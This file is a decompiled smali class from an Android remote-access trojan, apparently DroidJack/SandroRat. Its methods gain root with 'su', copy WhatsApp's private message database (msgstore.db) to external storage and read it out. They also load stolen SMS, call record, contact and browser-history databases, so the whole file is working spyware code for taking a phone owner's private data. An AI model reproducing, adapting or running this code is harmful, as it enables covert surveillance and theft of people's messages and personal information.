.class public Lnet/droidjack/server/ah;
.super Ljava/lang/Object;


# instance fields
.field private a:I

.field private b:Z

.field private c:Z

.field private d:Ljava/io/File;

.field private e:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 2

    const/4 v1, 0x0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/16 v0, 0x4c9

    iput v0, p0, Lnet/droidjack/server/ah;->a:I

    iput-boolean v1, p0, Lnet/droidjack/server/ah;->b:Z

    iput-boolean v1, p0, Lnet/droidjack/server/ah;->c:Z

    const/4 v0, 0x0

    iput-object v0, p0, Lnet/droidjack/server/ah;->d:Ljava/io/File;

    iput-object p1, p0, Lnet/droidjack/server/ah;->e:Landroid/content/Context;

    invoke-static {}, Lnet/droidjack/server/ae;->a()V

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/ah;)Ljava/io/File;
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/ah;->d:Ljava/io/File;

    return-object v0
.end method

.method static synthetic a(Lnet/droidjack/server/ah;Z)V
    .locals 0

    iput-boolean p1, p0, Lnet/droidjack/server/ah;->c:Z

    return-void
.end method


# virtual methods
.method protected a()[B
    .locals 3

    :try_start_0
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/WhatsApp/Databases/wams.db"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lnet/droidjack/server/ah;->d:Ljava/io/File;

    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const-string v1, "su"

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    new-instance v1, Ljava/io/DataOutputStream;

    invoke-virtual {v0}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "cp data/data/com.whatsapp/databases/msgstore.db "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lnet/droidjack/server/ah;->d:Ljava/io/File;

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    const-string v0, "\nexit"

    invoke-virtual {v1, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    const-wide/16 v0, 0x2710

    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    iget-object v0, p0, Lnet/droidjack/server/ah;->d:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_0

    :try_start_1
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    new-instance v1, Lnet/droidjack/server/ai;

    invoke-direct {v1, p0}, Lnet/droidjack/server/ai;-><init>(Lnet/droidjack/server/ah;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/concurrent/Future;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [B
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, "NoWA"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_0

    :catch_1
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_0

    :cond_0
    const-string v0, "NoWA"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_0
.end method

.method protected a(I)[B
    .locals 5

    const/4 v0, 0x0

    :try_start_0
    const-string v1, ""

    invoke-static {}, Landroid/os/Environment;->getDataDirectory()Ljava/io/File;

    move-result-object v2

    packed-switch p1, :pswitch_data_0

    :goto_0
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "/data/"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v4, p0, Lnet/droidjack/server/ah;->e:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/databases/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v3, Ljava/io/File;

    invoke-direct {v3, v2, v1}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_1

    new-instance v1, Ljava/io/FileInputStream;

    invoke-direct {v1, v3}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-static {v1}, La/c;->a(Ljava/io/InputStream;)[B

    move-result-object v0

    :cond_0
    :goto_1
    return-object v0

    :pswitch_0
    const-string v1, "SandroRat_CurrentSMS_Database"

    goto :goto_0

    :pswitch_1
    const-string v1, "SandroRat_RecordedSMS_Database"

    goto :goto_0

    :pswitch_2
    const-string v1, "SandroRat_CallRecords_Database"

    goto :goto_0

    :pswitch_3
    const-string v1, "SandroRat_Contacts_Database"

    goto :goto_0

    :pswitch_4
    const-string v1, "SandroRat_BrowserHistory_Database"

    goto :goto_0

    :cond_1
    const/4 v1, 0x2

    if-ne p1, v1, :cond_0

    const/4 v1, 0x1

    invoke-virtual {p0, v1}, Lnet/droidjack/server/ah;->a(I)[B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v1

    invoke-static {v1}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    nop

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
    .end packed-switch
.end method
